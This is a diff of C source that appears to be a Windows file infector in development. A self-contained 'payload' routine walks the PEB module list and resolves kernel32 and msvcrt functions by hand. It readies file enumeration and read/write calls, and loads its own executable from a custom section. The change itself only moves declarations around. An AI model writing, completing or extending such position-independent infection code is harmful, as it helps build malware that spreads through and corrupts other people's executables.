@@ -25,12 +25,21 @@ typedef struct _payload_info_t
 typedef HMODULE (*tLoadLibraryA)(LPCSTR);
 typedef FARPROC (*tGetProcAddress)(HMODULE, LPCSTR);
 typedef WINBOOL (*tFreeLibrary) (HMODULE);
-
+typedef HANDLE (*tFindFirstFileA) (LPCSTR, LPWIN32_FIND_DATAA);
+typedef WINBOOL (*tFindNextFileA) (HANDLE, LPWIN32_FIND_DATAA);
+typedef WINBOOL (*tFindClose) (HANDLE);
+typedef FILE *(*t_fopen)(const char *,const char *);
+typedef size_t (*t_fread)(void *, size_t, size_t, FILE *);
+typedef size_t (*t_fwrite)(const void *, size_t, size_t, FILE *);
+typedef int (*t_fseek)(FILE *, long, int);
+typedef int (*t_fclose)(FILE *);
+typedef void* (*t_memcpy)(void *, const void *, size_t);
+typedef int (*t_puts)(const char *);
+typedef int (*t_printf) (const char *, ...);
 // ==========
 void payload(void) SET_SECT __attribute__((used));
 
 void *get_image_base(wchar_t *module_name, LIST_ENTRY *list) SET_SECT;
-
 IMAGE_EXPORT_DIRECTORY *get_IMAGE_EXPORT_DIRECTORY(void *image_base) SET_SECT;
 void *get_kernel_32_func(char *function_name, IMAGE_EXPORT_DIRECTORY* i_ex_dir, void *image_base) SET_SECT;
 
@@ -54,6 +63,22 @@ int main()
 
 void payload(void)
 {
+    // defines
+    char sLoadLibraryA[] = "LoadLibraryA";
+    char sGetProcAddress[] = "GetProcAddress";
+    char sFreeLibrary[] = "FreeLibrary";
+    char sFindFirstFileA[] = "FindFirstFileA";
+    char sFindNextFileA[] = "FindNextFileA";
+    char sFindClose[] = "FindClose";
+    char s_fopen[] = "fopen";
+    char s_fread[] = "fread";
+    char s_fwrite[] = "fwrite";
+    char s_fseek[] = "fseek";
+    char s_fclose[] = "fclose";
+    char s_memcpy[] = "memcpy";
+    char s_puts[] = "puts";
+    char s_printf[] = "printf";
+
     // get_InMemoryOrderModuleList
     LIST_ENTRY *list = 0;
     {
@@ -74,9 +99,6 @@ void payload(void)
     void *current_image_base = entry->DllBase;
 
     // load base funcs
-    char sLoadLibraryA[] = "LoadLibraryA";
-    char sGetProcAddress[] = "GetProcAddress";
-    char sFreeLibrary[] = "FreeLibrary";
 
     LOAD(LoadLibraryA);
     LOAD(GetProcAddress);
@@ -86,39 +108,13 @@ void payload(void)
     char s_msvcrt[] = "msvcrt.dll";
     HMODULE msvcrt_hModule = pLoadLibraryA(s_msvcrt);  // Load the C runtime library (msvcrt.dll)
 
-
 // do sth.
-    typedef int (*t_puts)(const char *);
-    char s_puts[] = "puts";
-    typedef int (*t_printf) (const char *, ...);
-    char s_printf[] = "printf";
 
     // test
     {
         char msg[] = "_|Hallo|_";
         FUNCTION(puts)(msg);
     }
-
-    // defines
-    typedef HANDLE (*tFindFirstFileA) (LPCSTR, LPWIN32_FIND_DATAA);
-    typedef WINBOOL (*tFindNextFileA) (HANDLE, LPWIN32_FIND_DATAA);
-    typedef WINBOOL (*tFindClose) (HANDLE);
-    char sFindFirstFileA[] = "FindFirstFileA";
-    char sFindNextFileA[] = "FindNextFileA";
-    char sFindClose[] = "FindClose";
-
-    typedef FILE *(*t_fopen)(const char *,const char *);
-    typedef size_t (*t_fread)(void *, size_t, size_t, FILE *);
-    typedef size_t (*t_fwrite)(const void *, size_t, size_t, FILE *);
-    typedef int (*t_fseek)(FILE *, long, int);
-    typedef int (*t_fclose)(FILE *);
-    typedef void* (*t_memcpy)(void *, const void *, size_t);
-    char s_fopen[] = "fopen";
-    char s_fread[] = "fread";
-    char s_fwrite[] = "fwrite";
-    char s_fseek[] = "fseek";
-    char s_fclose[] = "fclose";
-    char s_memcpy[] = "memcpy";
 
     // "global" variables
     char v_sect_name[] = V_SECT_NAME;
@@ -362,12 +358,10 @@ void payload(void)
     // ===========================================
     get_payload:{
         asm ("nop");
-
         typedef FILE *(*t__wfopen)(const wchar_t *, const wchar_t *);
         typedef void * (*t_malloc)(size_t);
         char s__wfopen[] = "_wfopen"; 
         char s_malloc[] = "malloc"; 
-
 
         wchar_t *current_exe_name = ((UNICODE_STRING*)(entry->Reserved4))->Buffer;
 
